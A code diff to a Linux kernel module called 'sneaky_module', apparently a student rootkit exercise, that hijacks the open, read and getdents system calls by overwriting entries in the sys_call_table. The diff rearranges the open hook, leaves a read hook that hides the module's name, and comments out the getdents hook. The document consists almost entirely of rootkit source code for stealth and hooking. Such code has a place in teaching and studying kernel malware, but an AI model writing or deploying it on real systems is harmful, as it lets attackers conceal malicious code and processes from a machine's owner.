@@ -99,7 +99,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
     if (status) {
       printk(KERN_INFO "Fail to call copy_to_user\n");
     }
-    result = original_call(pathname, flags);
+
   } else {
     /* if (!strcmp(pathname, proc_dir)) { */
     /*   printk(KERN_INFO "Starting to hide Sneaky PID.\n"); */
@@ -110,11 +110,13 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
       hide_module_flag = true;
     }
   }
+  result = original_call(pathname, flags);
   return result;
 }
 
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   ssize_t byte_read;
+
   byte_read = original_read(fd, buf, count);
   if (hide_module_flag) {
     char *module_name = "sneaky_module";
@@ -152,11 +154,11 @@ static int initialize_sneaky_module(void) {
   // This is the magic! Save away the original 'open' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
+  original_getdents = (void *)*(sys_call_table + __NR_getdents);
+  //  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+
   original_call = (void *)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
-
-  original_getdents = (void *)*(sys_call_table + __NR_getdents);
-  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
   original_read = (void *)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
